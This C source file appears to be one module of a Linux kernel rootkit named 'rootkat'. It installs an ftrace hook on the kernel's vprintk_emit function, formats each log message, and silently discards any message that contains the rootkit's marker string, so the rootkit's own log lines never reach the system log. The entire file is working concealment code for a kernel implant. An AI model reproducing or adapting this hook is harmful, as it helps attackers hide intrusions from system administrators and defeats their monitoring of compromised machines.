// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/stdarg.h>
#include "ftrace_hook.h"
#include "kallsyms.h"
#include "hook_printk.h"

#define TAG "rootkat/hook_printk: "

#define ROOTKAT_PRINTK_MARKER "rootkat"

static const char * const vprintk_emit_candidates[] = {
	"vprintk_emit", NULL,
};

typedef int (*vprintk_emit_t)(int facility, int level,
                              const struct dev_printk_info *dev_info,
                              const char *fmt, va_list args);

static int rootkat_vprintk_emit(int facility, int level,
                                const struct dev_printk_info *dev_info,
                                const char *fmt, va_list args);

static struct rootkat_hook hook_vprintk_emit = {
	.candidates          = vprintk_emit_candidates,
	.replacement         = rootkat_vprintk_emit,
	/* Filter rootkat.ko's own pr_info calls — that's the whole point
	 * here, so we explicitly opt out of the within_module recursion
	 * guard. vsnprintf + strnstr in our replacement don't recurse into
	 * vprintk_emit, so there's no actual loop hazard. */
	.intercept_own_calls = true,
};

/*
 * Format the message into a per-CPU stack buffer, scan for the marker,
 * drop on match. va_copy the args first so the original list stays
 * usable for the orig call when we don't drop.
 *
 * 256 bytes covers the vast majority of kernel printks; longer
 * messages get truncated for the marker check, which is fine because
 * the marker prefix sits at the start of every rootkat line ("rootkat:
 * ...", "rootkat/...:", etc.) — well within the first 64 bytes.
 *
 * Recursion safety: if our filter call ever printk's (it doesn't —
 * vsnprintf + strstr only), the ftrace thunk's within_module guard
 * would catch it. Format-only path here keeps this strictly pure.
 */
static int rootkat_vprintk_emit(int facility, int level,
                                const struct dev_printk_info *dev_info,
                                const char *fmt, va_list args)
{
	vprintk_emit_t orig = (vprintk_emit_t)hook_vprintk_emit.original;
	char buf[256];
	va_list args_copy;
	int n;

	if (!fmt)
		return orig(facility, level, dev_info, fmt, args);

	va_copy(args_copy, args);
	n = vsnprintf(buf, sizeof(buf), fmt, args_copy);
	va_end(args_copy);

	if (n > 0 && strnstr(buf, ROOTKAT_PRINTK_MARKER, sizeof(buf)))
		return 0;

	return orig(facility, level, dev_info, fmt, args);
}

int rootkat_hook_printk_install(void)
{
	return rootkat_hook_install(&hook_vprintk_emit);
}

void rootkat_hook_printk_remove(void)
{
	rootkat_hook_remove(&hook_vprintk_emit);
}
